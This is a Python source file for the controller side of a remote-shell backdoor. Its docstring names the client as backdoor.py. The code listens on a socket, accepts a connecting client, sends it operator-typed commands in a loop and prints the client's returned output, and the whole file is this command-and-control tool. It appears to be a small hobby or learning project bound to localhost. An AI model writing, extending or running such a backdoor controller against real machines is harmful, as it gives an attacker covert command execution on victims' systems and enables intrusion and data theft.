"""
Server

Sends commands to the client to be ran by it (backdoor.py)
"""

import logging
import socket

logger = logging.getLogger(__name__)

try:
    from colorama import Fore
    import coloredlogs

    coloredlogs.install(
        level='DEBUG',
        logger=logger,
        fmt="%(asctime)s %(name)s[%(process)d] %(levelname)s %(message)s"
    )

except ImportError:
    logger_stderr_handler = logging.StreamHandler()

    logger_stderr_handler.setFormatter(
        logging.Formatter("%(asctime)s %(name)s[%(process)d] %(levelname)s %(message)s")
    )

    logger.addHandler(logger_stderr_handler)

def _format_socket_addr(
    socket_addr: tuple[socket.socket, ...]
) -> str:
    if 'Fore' not in globals():
        return f"{socket_addr[0]}:{socket_addr[1]}"

    return (f"{Fore.CYAN}{socket_addr[0]}{Fore.RESET}:"
    f"{Fore.GREEN}{socket_addr[1]}{Fore.RESET}")

IP = '127.0.0.1'
PORT = 8081

logger.info("Initiating server")
server = socket.socket()
logger.info("Server initiated")

server.bind((IP, PORT))

logger.info("Awaiting client")
server.listen(1)

client, client_addr = server.accept()
logger.info(
    _format_socket_addr(client_addr) +" Connected to the server!"
)

while True:
    server_command = input(
        f"[{_format_socket_addr(client_addr)}] > "
    )
    server_command = server_command.encode()

    client.send(server_command)

    client_stdout = ""

    while True:
        try:
            client.settimeout(1.0)
            received_data = client.recv(1024)
        except socket.timeout:
            break

        client_stdout += received_data.decode()

    print(client_stdout)
